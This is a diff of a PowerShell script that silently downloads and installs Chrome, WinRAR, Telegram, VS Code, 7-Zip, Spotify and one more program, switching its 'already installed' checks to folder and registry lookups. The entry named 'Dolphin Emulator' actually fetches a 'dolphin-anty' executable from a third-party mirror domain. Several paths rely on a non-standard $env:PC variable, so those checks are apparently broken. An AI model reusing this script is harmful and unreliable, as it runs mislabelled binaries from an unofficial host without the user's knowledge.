@@ -1,7 +1,20 @@
-
+# Папка для інсталяторів
 $downloadDir = "C:\Installers"
 if (!(Test-Path $downloadDir)) {
     New-Item -ItemType Directory -Path $downloadDir | Out-Null
+}
+
+function Test-Installed($appName, $installPath, $regKey) {
+    # Перевірка по папці
+    if ($installPath -and (Test-Path $installPath)) {
+        return $true
+    }
+    # Перевірка по реєстру
+    if ($regKey) {
+        $reg = Get-ItemProperty -Path $regKey -ErrorAction SilentlyContinue
+        if ($reg) { return $true }
+    }
+    return $false
 }
 
 $apps = @(
@@ -9,44 +22,57 @@ $apps = @(
         name = "Chrome"
         url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
         args = "/silent /install"
-        check = { Get-Command "chrome.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome"
     },
     @{
         name = "WinRAR"
         url = "https://www.rarlab.com/rar/winrar-x64-713uk.exe"
         args = "/S"
-        check = { Get-Command "winrar.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Program Files\WinRAR\WinRAR.exe"
+        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver"
     },
     @{
         name = "Telegram"
         url = "https://telegram.org/dl/desktop/win"
         args = ""
-        check = { Get-Command "Telegram.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Users\$env:PC\AppData\Roaming\Telegram Desktop\Telegram.exe"
+        regKey = ""
     },
     @{
         name = "Dolphin Emulator"
         url = "https://app.dolphin-anty-mirror3.net/anty-app/dolphin-anty-win-latest.exe"
         args = "/S"
-        check = { Get-Command "dolphin.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Program Files\Dolphin\Dolphin.exe"
+        regKey = ""
     },
     @{
         name = "Visual Studio Code"
         url = "https://update.code.visualstudio.com/latest/win32-x64-user/stable"
         args = "/silent"
-        check = { Get-Command "code.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Users\$env:PC\AppData\Local\Programs\Microsoft VS Code\Code.exe"
+        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Visual Studio Code"
+    },
+    @{
+        name = "7-Zip"
+        url = "https://www.7-zip.org/a/7z2400-x64.exe"
+        args = "/S"
+        installPath = "C:\Program Files\7-Zip\7z.exe"
+        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-Zip"
     },
     @{
         name = "Spotify"
         url = "https://download.scdn.co/SpotifySetup.exe"
         args = "/silent"
-        check = { Get-Command "spotify.exe" -ErrorAction SilentlyContinue }
+        installPath = "C:\Users\$env:PC\AppData\Roaming\Spotify\Spotify.exe"
+        regKey = ""
     }
 )
 
 foreach ($app in $apps) {
     $path = "$downloadDir\$($app.name).exe"
 
-    if (& $app.check) {
+    if (Test-Installed $app.name $app.installPath $app.regKey) {
         Write-Host "`nSkipping $($app.name), already installed."
         continue
     }
